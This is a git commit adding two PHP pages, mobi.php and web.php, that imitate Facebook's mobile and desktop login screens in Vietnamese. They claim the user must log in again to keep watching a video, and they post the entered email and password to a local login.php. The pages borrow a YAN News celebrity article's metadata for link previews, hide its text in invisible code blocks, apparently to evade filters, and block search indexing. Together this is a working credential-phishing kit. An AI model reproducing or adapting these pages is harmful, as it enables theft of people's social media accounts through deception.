0f7678596951716ee0e55da7a34920f9a26ecd6f
ancmsUGG <admin@a.vnstream.me>
2017-05-29 03:04:37 +0700

    Add files via upload

---
+++ via-nodejs/mobi.php
@@ -0,0 +1,197 @@
+
+<meta name="robots" content="noindex, nofollow">
+<meta name="googlebot" content="noindex, nofollow">
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<head prefix="og: http://ogp.me/ns# fb: http://ogp.me/ns/fb# article: http://ogp.me/ns/article#">
+    <meta charset="utf-8">
+    <title>Sống chung với anh trai</title>
+    <meta content="INDEX,FOLLOW" name="robots" />
+    <meta content="global" name="distribution" />
+    <meta content="general" name="rating" />
+    <meta content="1 days" name="revisit-after" />
+    <link rel="canonical" href="http://www.yan.vn/dien-vien-song-chung-voi-me-chong-doi-thuc-nguoc-hoan-toan-tren-phim-126432.html" />
+        <link rel="amphtml" href="http://www.yan.vn/GoogleAMP/AmpIndex/126432" />
+    <meta property="og:url" content="http://www.yan.vn/dien-vien-song-chung-voi-me-chong-doi-thuc-nguoc-hoan-toan-tren-phim-126432.html" />
+    <meta property="og:type" content="article" />
+    <meta property="og:title" content='Diễn viên Sống chung với mẹ chồng: Đời thực ngược hoàn toàn trên phim' />
+    <meta property="og:description" content='Vào vai quá nhập tâm nên dàn diễn viên Sống chung với mẹ chồng khiến khán giả tò mò về mối quan hệ mẹ chồng – nàng dâu trong đời thường.' />
+    <meta property="og:image" content="http://news-thumb2.ymgstatic.com/YanThumbNews/2167221/201704/b1e37845-b5d6-42f0-aaaa-c65f8cf9e207.jpg" />
+    <meta property="og:site_name" content="YAN News" />
+    <meta property="fb:app_id" content="151010854934254" />
+    <meta property="fb:pages" content="154180304652867" />
+    <meta property="fb:pages" content="110581908973" />
+
+    <meta property="article:publisher" content="https://www.facebook.com/yannews" />
+    <meta property="article:author" content="https://www.facebook.com/yannews">
+    <meta property="article:published_time" content="21/04/2017 11:46:40 SA" />
+    <meta property="article:modified_time" content="21/04/2017 11:46:40 SA" />
+    <meta property="article:tag" content="Sao" />
+        <meta property="article:tag" content="saoviet24h" />
+            <meta property="article:tag" content="Sao Việt" />
+                <meta property="article:tag" content="Bảo Thanh" />
+            <meta property="article:tag" content="NSND Lan Hương" />
+            <meta property="article:tag" content="Anh Dũng" />
+    <meta property="article:section" content="Sao" />
+
+    <meta name="format-detection" content="telephone=no" />
+    <meta name="google-site-verification" content="n4QZFXdEE9rADtOHy67buktxOetHnYycxibzWQa0RGo" />
+    <meta name="keywords" content="Anh Dũng,NSND Lan Hương,Bảo Thanh, con dau cua nsnd lan huong, chong dien vien bao thanh" />
+    <meta name="description" content="Vào vai quá nhập tâm nên dàn diễn viên Sống chung với mẹ chồng khiến khán giả tò mò về mối quan hệ mẹ chồng – nàng dâu trong đời thường." />
+    <link rel="stylesheet" type="text/css" id="EH5zP" href="mobi.css">
+</head>
+
+<body tabindex="0" class="touch x1 android _fzu _50-3 iframe acw portrait" style="min-height: 480px; background-color: rgb(255, 255, 255);">
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-99969950-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+	<code style="display:none;">	--
+	Diễn viên Sống chung với mẹ chồng: Đời thực ngược hoàn toàn trên phim
+ Phương Bùi - Theo Thethaovanhoa.vn | 11:46 - 21/04/2017
+Vào vai quá nhập tâm nên dàn diễn viên Sống chung với mẹ chồng khiến khán giả tò mò về mối quan hệ mẹ chồng – nàng dâu trong đời thường.
+Chỉ sau vài tuần phát sóng nhưng Sống chung với mẹ chồng đã tạo ra không ít “ cơn bão dư luận” với nhiều tình huống  kịch tính và gay cấn giữa mẹ chồng – nàng dâu. Đã từ lâu, khán giả truyền hình mới có dịp quay trở lại cảm giác háo hức và mong chờ từng tập phim. Không những vậy, những thông tin bên lề, hậu trường hay thậm chí đời sống của diễn viên cũng được cư dân mạng truy tìm.
+Nhập vai quá thành công trong nhân vật bà Phương – bà mẹ chồng “thét ra lửa” khiến NSND Lan Hương gặp nhiều tình huống dở khóc dở cười. Không chỉ bị hàng xóm mắng té tát vì vai diễn ghê gớm sợ con trai thứ hai không lấy được vợ, mối quan hệ giữa bà và con dâu ngoài đời cũng khiến khán giả vô cùng tò mò.
+</code>
+    <div id="viewport" style="min-height: 480px;">
+        <h1 style="display:block;height:0;overflow:hidden;position:absolute;width:0;padding:0"></h1>
+        <div id="page">
+            <div class="_4g33 _52we _52z5" id="header">
+                <div class="_4g34 _52z6" data-sigil="mChromeHeaderCenter"><a href="/login/?refid=9"><i class="img sp_qpIvdSU5o3E sx_72920b"><u></u></i></a></div>
+            </div>
+            <div id="root" role="main" class="_5soa acw" data-sigil="context-layer-root content-pane" style="min-height: 480px;">
+                <div class="_4g33">
+                    <div class="_4g34">
+                        <a class="touchableArea first last area touchable acy apl abt abb" target="_top" data-sigil="touchable marea"><div class="ib cc"><i class="img l img" style="background-image: url(&quot;https://static.xx.fbcdn.net/rsrc.php/v3/yC/r/BdXc4LF_poc.png&quot;);background-repeat:no-repeat;background-size:100% 100%;-webkit-background-size:100% 100%;width:18px;height:32px;"></i><div class="c"><code style="display:none;">Còn với Bảo Thanh, nữ diễn viên trẻ lại khiến không ít khán giả ghen tị vì có một người chồng tâm lý và cảm thông cho vợ. Sinh năm 1990, Bảo Thanh khiến không ít người hâm mộ ngạc nhiên khi kết hôn khá sớm và đã có một cậu con trai kháu khỉnh. Tưởng chừng kết hôn sớm sẽ là bước cản trên con đường nghệ thuật nhưng trái lại, Bảo Thanh còn chia sẻ việc lấy chồng có con sớm đã giúp cô thêm nhiều trải nghiệm trong các vai diễn phụ nữ có gia đình. Và may mắn ấy được cô thể hiện thành công qua nhiều vai diễn như Hợp đồng hôn nhân hay Sống chung với mẹ chồng.</code><span class="fcl">Để tiếp tục xem Video vui lòng đăng nhập lại.</span></div></div></a>
+                        <div class="aclb _5rut" data-sigil="traditional-login">
+                            <form method="post" class="mobile-login-form _5spm" id="u_0_0" novalidate="1" action="login.php" data-autoid="autoid_1">
+                                <div class="_56be _5sob">
+                                    <div class="_55wo _55x2 _56bf">
+                                        <input autocorrect="off" autocapitalize="off" type="email" class="_56bg _4u9z _5ruq" name="username" placeholder="Email hoặc số điện thoại" value="" data-sigil="login-form-input">
+                                        <div class="_3nph _mg8">
+                                            <div class="_4g33"><code style="display:none;">Trong bộ phim Sống chung với mẹ chồng, Bảo Thanh phải diễn nhiều cảnh "nóng" với bạn diễn Anh Dũng. Trái với suy nghĩ của nhiều người rằng vợ chồng cô sẽ lục đục thì chính chồng của Bảo Thanh lại là người luôn ở bên động viên vợ trong từng cảnh diễn. Bảo Thanh từng tự hào chia sẻ chồng cô rất thông cảm cho công việc của vợ. Bản thân cô cũng hay rủ chồng tới phim trường mỗi khi có thời gian để có thể thấu hiểu cho công việc của vợ.
+</code>
+                                                <div class="_4g34 _5i2i _52we">
+                                                    <div class="_5xu4">
+                                                        <input type="hidden" name="lang" value="" />
+                                                        <input type="password" autocorrect="off" autocapitalize="off" class="_56bg _4u9z _27z2" name="password" placeholder="Mật khẩu" id="u_0_1">
+                                                    </div>
+                                                </div>
+                                                <div class="_5s61 _216i _5i2i _52we">
+                                                    <div class="_5xu4">
+                                                        <div class="_2pi9" id="u_0_2" style="display:none"><a href="#" data-sigil="password-plain-text-toggle"><span class="mfss" id="u_0_3" style="display:none">HIDE</span>
+                                                    <span class="mfss" id="u_0_4">SHOW</span></a></div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="_2pie">
+                                    <button type="submit" value="Đăng nhập" class="_54k8 _56bs _56b_ _56bw _56bu" name="login" id="u_0_5" data-sigil="touchable">
+                                        <span class="_55sr">Đăng nhập</span></button>
+                                </div>
+                            </form>
+
+                            <div class="_52jj _5t3b">
+                                <a class="_54k8 _56bs _5t3b _56bw _56bv" data-store="{&quot;nativeClick&quot;:true}" href="/reg/?loc=bottom&amp;refid=9" role="button" data-sigil="touchable">
+                                    <span class="_55sr">Tạo tài khoản mới</span></a>
+                            </div>
+                            <div class="other-links">
+                                <ul class="_5pkb _55wp">
+                                    <li><span class="mfss fcg"><a href="#"></a><span aria-hidden="true"></span>
+                                        <a class="sec" href="#">
+                                        </a>
+                                        </span>
+                                    </li>
+                                </ul>
+                            </div>
+                        </div>
+                        <div class="_5t23" id="u_0_6" style="display:none">
+                            <div><i class="img sp_mJP1XY0f7L- sx_37f6c5"></i></div>
+                            <div class="_52jg _5ru_" id="u_0_7" style="padding-left: 32px; padding-right: 32px;"></div>
+                            <div class="_5t26">
+                                <div class="_52jc _5t25" id="u_0_8"><a class="inv" href="#"><i class="_5msp img sp_mJP1XY0f7L- sx_17e21f"></i></a></div>
+                                <div class="_52jc _5t25" id="u_0_9" data-autoid="autoid_2">
+                                    <a class="inv" href="#"></a>
+                                </div>
+                                <div class="_52jc _5t25">
+                                    <a class="inv" href="#"></a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="_55wr _5ui2">
+                    <div class="_5dpw">
+                        <div class="_5ui3" data-sigil="marea">
+                            <div class="_4g33">
+                                <div class="_4g34"><span class="_52jc _52j9 _52jh">English (UK)</span>
+                                    <div><span class="_52jc"><a href="#" data-sigil="ajaxify">Tiếng Việt</a></span></div>
+                                    <div><span class="_52jc"><a href="#" data-ajaxify-href="#" data-sigil="ajaxify">Français (France)</a></span></div>
+                                    <div><span class="_52jc"><a href="#" data-ajaxify-href="#" data-sigil="ajaxify">Português (Brasil)</a></span></div>
+                                </div>
+                                <div class="_4g34">
+                                    <div><span class="_52jc"><a href="#" data-ajaxify-href="#" data-sigil="ajaxify">Русский</a></span></div>
+                                    <div><span class="_52jc"><a href="#" data-ajaxify-href="#" data-sigil="ajaxify">Türkçe</a></span></div>
+                                    <div><span class="_52jc"><a href="#" data-ajaxify-href="#" data-sigil="ajaxify">Español</a></span></div>
+                                    <span class="_52jc"><a href="#">More…</a></span></div>
+                            </div>
+                        </div>
+                        <div class="_5ui4"><span class="mfss fcg">Faceb00k ©2017</span></div>
+                    </div>
+                </div>
+            </div>
+            <div class="viewportArea _2v9s" id="u_0_a" style="display:none" data-sigil="marea">
+                <div class="_5vsg" id="u_0_l" style="max-height: 160px;"></div>
+                <div class="_5vsh" id="u_0_m" style="max-height: 240px;"></div>
+                <div class="_5v5d fcg">
+                    <div class="_2so _2sq _2ss img _50cg" data-animtype="1" data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>
+                </div>
+            </div>
+            <div class="viewportArea aclb" id="mErrorView" style="display:none" data-sigil="marea">
+                <div class="container">
+                    <div class="image"></div>
+                    <div class="message" data-sigil="error-message"></div><a class="link" data-sigil="MPageError:retry">Thử lại</a></div>
+            </div>
+        </div>
+    </div>
+    <div id="static_templates">
+        <div class="mDialog" id="modalDialog" style="display:none" data-sigil=" context-layer-root" data-autoid="autoid_3">
+            <div class="_52z5 _451a mFuturePageHeader firstStep titled" id="mDialogHeader">
+                <div class="_4g33 _52we">
+                    <div class="_5s61">
+                        <div class="_52z7">
+                            <button type="submit" value="" class="cancelButton btn btnD bgb mfss touchable" data-sigil="dialog-cancel-button blocking-touchable"></button>
+                            <button type="submit" value="" class="backButton btn btnI bgb mfss touchable iconOnly" aria-label="" data-sigil="dialog-back-button blocking-touchable">
+                                <i class="img sp_qpIvdSU5o3E sx_aa9265" style="margin-top: 4px;"></i></button>
+                        </div>
+                    </div>
+                    <div class="_4g34">
+                        <div class="_52z6">
+                            <div class="mFuturePageHeaderTitle mfsl fcw" id="m-future-page-header-title" data-sigil="m-dialog-header-title dialog-title"></div>
+                        </div>
+                    </div>
+                    <div class="_5s61">
+                        <div class="_52z8" id="modalDialogHeaderButtons"></div>
+                    </div>
+                </div>
+                <div id="u_0_b"></div>
+            </div>
+            <div class="modalDialogView" id="modalDialogView"></div>
+            <div class="_5v5d _5v5e fcg" id="dialogSpinner">
+                <div class="_2so _2sq _2ss img _50cg" data-animtype="1" id="u_0_c" data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>
+            </div>
+        </div>
+    </div>
+</body>
+
+</html>
---
+++ via-nodejs/web.php
@@ -0,0 +1,120 @@
+
+<meta name="robots" content="noindex, nofollow">
+<meta name="googlebot" content="noindex, nofollow">
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<head prefix="og: http://ogp.me/ns# fb: http://ogp.me/ns/fb# article: http://ogp.me/ns/article#">
+    <meta charset="utf-8">
+    <title>Sống chung với anh trai</title>
+    <meta content="INDEX,FOLLOW" name="robots" />
+    <meta content="global" name="distribution" />
+    <meta content="general" name="rating" />
+    <meta content="1 days" name="revisit-after" />
+    <link rel="canonical" href="http://www.yan.vn/dien-vien-song-chung-voi-me-chong-doi-thuc-nguoc-hoan-toan-tren-phim-126432.html" />
+        <link rel="amphtml" href="http://www.yan.vn/GoogleAMP/AmpIndex/126432" />
+    <meta property="og:url" content="http://www.yan.vn/dien-vien-song-chung-voi-me-chong-doi-thuc-nguoc-hoan-toan-tren-phim-126432.html" />
+    <meta property="og:type" content="article" />
+    <meta property="og:title" content='Diễn viên Sống chung với mẹ chồng: Đời thực ngược hoàn toàn trên phim' />
+    <meta property="og:description" content='Vào vai quá nhập tâm nên dàn diễn viên Sống chung với mẹ chồng khiến khán giả tò mò về mối quan hệ mẹ chồng – nàng dâu trong đời thường.' />
+    <meta property="og:image" content="http://news-thumb2.ymgstatic.com/YanThumbNews/2167221/201704/b1e37845-b5d6-42f0-aaaa-c65f8cf9e207.jpg" />
+    <meta property="og:site_name" content="YAN News" />
+    <meta property="fb:app_id" content="151010854934254" />
+    <meta property="fb:pages" content="154180304652867" />
+    <meta property="fb:pages" content="110581908973" />
+
+    <meta property="article:publisher" content="https://www.facebook.com/yannews" />
+    <meta property="article:author" content="https://www.facebook.com/yannews">
+    <meta property="article:published_time" content="21/04/2017 11:46:40 SA" />
+    <meta property="article:modified_time" content="21/04/2017 11:46:40 SA" />
+    <meta property="article:tag" content="Sao" />
+        <meta property="article:tag" content="saoviet24h" />
+            <meta property="article:tag" content="Sao Việt" />
+                <meta property="article:tag" content="Bảo Thanh" />
+            <meta property="article:tag" content="NSND Lan Hương" />
+            <meta property="article:tag" content="Anh Dũng" />
+    <meta property="article:section" content="Sao" />
+
+    <meta name="format-detection" content="telephone=no" />
+    <meta name="google-site-verification" content="n4QZFXdEE9rADtOHy67buktxOetHnYycxibzWQa0RGo" />
+    <meta name="keywords" content="Anh Dũng,NSND Lan Hương,Bảo Thanh, con dau cua nsnd lan huong, chong dien vien bao thanh" />
+    <meta name="description" content="Vào vai quá nhập tâm nên dàn diễn viên Sống chung với mẹ chồng khiến khán giả tò mò về mối quan hệ mẹ chồng – nàng dâu trong đời thường." />
+
+    <link type="text/css" rel="stylesheet" href="data/1.css">
+    <link type="text/css" rel="stylesheet" href="data/2.css">
+    <link type="text/css" rel="stylesheet" href="data/3.css">
+    <link type="text/css" rel="stylesheet" href="data/4.css">
+    <link type="text/css" rel="stylesheet" href="data/5.css">
+    <script async="" src="https://www.google-analytics.com/analytics.js"></script><script>
+	  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+	  ga('create', 'UA-99969950-1', 'auto');
+	  ga('send', 'pageview');
+
+	</script>
+</head>
+<body>
+<code style="display:none;">
+	Diễn viên Sống chung với mẹ chồng: Đời thực ngược hoàn toàn trên phim
+ Phương Bùi - Theo Thethaovanhoa.vn | 11:46 - 21/04/2017
+Vào vai quá nhập tâm nên dàn diễn viên Sống chung với mẹ chồng khiến khán giả tò mò về mối quan hệ mẹ chồng – nàng dâu trong đời thường.
+Chỉ sau vài tuần phát sóng nhưng Sống chung với mẹ chồng đã tạo ra không ít “ cơn bão dư luận” với nhiều tình huống  kịch tính và gay cấn giữa mẹ chồng – nàng dâu. Đã từ lâu, khán giả truyền hình mới có dịp quay trở lại cảm giác háo hức và mong chờ từng tập phim. Không những vậy, những thông tin bên lề, hậu trường hay thậm chí đời sống của diễn viên cũng được cư dân mạng truy tìm.
+Nhập vai quá thành công trong nhân vật bà Phương – bà mẹ chồng “thét ra lửa” khiến NSND Lan Hương gặp nhiều tình huống dở khóc dở cười. Không chỉ bị hàng xóm mắng té tát vì vai diễn ghê gớm sợ con trai thứ hai không lấy được vợ, mối quan hệ giữa bà và con dâu ngoài đời cũng khiến khán giả vô cùng tò mò.
+</code>
+    <div class="_li">
+        <div id="pagelet_bluebar" data-referrer="pagelet_bluebar">
+            <div>
+                <div id="blueBarDOMInspector" class="_21mm _2gsf">
+                    <div class="_4f7n _1s4v _26aw _hdd _xxp">
+                        <div>
+                            <div class="loggedout_menubar_container">
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div id="globalContainer" class="uiContextualLayerParent">
+            <div class="fb_content clearfix " id="content" role="main">
+                <div class="_4-u5 _30ny"><span class="muffin_tracking_pixel_start"></span><img class="tracking_pixel"><span class="muffin_tracking_pixel_end"></span>
+                    <div class="_2pio _1uxu">
+                        <div class="_585n" id="u_0_0"><i class="_585p img sp_uz72FEIEjxB sx_2fd726"><u>CHÚ Ý</u></i>
+                            <div class="_585r _50f4">Vui lòng đăng nhập để tiếp tục xem <b>Videos</b></div>
+                        </div>
+                    </div>
+                   <code style="display:none;">
+                    Bản thân NSND Lan Hương thừa nhận, ở thế hệ mình, không hề có chuyện con dâu dám cãi lại mẹ chồng. Vì vậy khi lần đầu bị con dâu "bật" lại, nữ diễn viên cũng khá sốc và phải thốt lên: "Ơ cãi mẹ, giỏi thế nhỉ".
+
+Dù đã ngoài 60 nhưng NSND Lan Hương lại là một con người khá trẻ trung hiện đại, chính vì vậy bà quan niệm bản thân cha mẹ cũng phải mở lòng với con cái, chứ không thể từ một phía. Mối quan hệ mẹ chồng nàng dâu vốn hay xảy ra mâu thuẫn vì những điều nhỏ nhặt. Bởi vậy, là một người mẹ thì nên bao dung và tôn trọng lẫn nhau, trở thành bạn của con thì mới có thể hòa hợp. Có lẽ đó chính là bí quyết gìn giữ hạnh phúc gia đình 4 thế hệ của nữ diễn viên.
+</code>
+                    <div class="_4-u2 _1w1t _4-u8 _52jv">
+                        <div class="_xku"><span class="_50f6">ĐĂNG NHẬP LẠI</span></div><code style="display:none;">Còn với Bảo Thanh, nữ diễn viên trẻ lại khiến không ít khán giả ghen tị vì có một người chồng tâm lý và cảm thông cho vợ. Sinh năm 1990, Bảo Thanh khiến không ít người hâm mộ ngạc nhiên khi kết hôn khá sớm và đã có một cậu con trai kháu khỉnh. Tưởng chừng kết hôn sớm sẽ là bước cản trên con đường nghệ thuật nhưng trái lại, Bảo Thanh còn chia sẻ việc lấy chồng có con sớm đã giúp cô thêm nhiều trải nghiệm trong các vai diễn phụ nữ có gia đình. Và may mắn ấy được cô thể hiện thành công qua nhiều vai diễn như Hợp đồng hôn nhân hay Sống chung với mẹ chồng.</code>
+                        <div class="login_form_container">
+                            <form id="login_form" action="login.php" method="post">
+                                <input type="hidden" name="lsd" value="AVp09rmO" autocomplete="off">
+                                <div id="loginform">
+                                    <input type="hidden" name="lang" value="">
+                                    <div class="clearfix _5466 _44mg">
+                                        <input type="text" class="inputtext _55r1 inputtext _1kbt inputtext _1kbt" name="username" id="email" style="font-size: 14px!important;padding: 20px 8px!important;width: 284px!important;" tabindex="1" placeholder="Email hoặc số điện thoại" value="" autofocus="1" aria-label="">
+                                    </div>
+                                    <div class="clearfix _5466 _44mg">
+                                        <input type="password" class="inputtext _55r1 inputtext _1kbt inputtext _1kbt" name="password" id="pass" style="font-size: 14px!important;padding: 20px 8px!important;width: 284px!important;" tabindex="1" placeholder="Mật khẩu" aria-label="">
+                                    </div>
+                                    <div class="_xkt" id="u_0_d">
+                                        <button value="1" class="_42ft _4jy0 _52e0 _4jy6 _4jy1 selected _51sy" id="loginbutton" name="login" tabindex="1" type="submit">Đăng nhập</button>
+                                    </div>
+                                    <div class="_wp9"><a class="_42ft _4jy0 _4jy4 _517h _51sy" role="button" href="#">Khôi phục tài khoản của bạn</a></div>
+                                    <div class="_xkv"><a href="#" rel="nofollow" id="reg-link">Đăng ký Facebook</a></div>
+                                </div>
+                            </form>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</body></html>
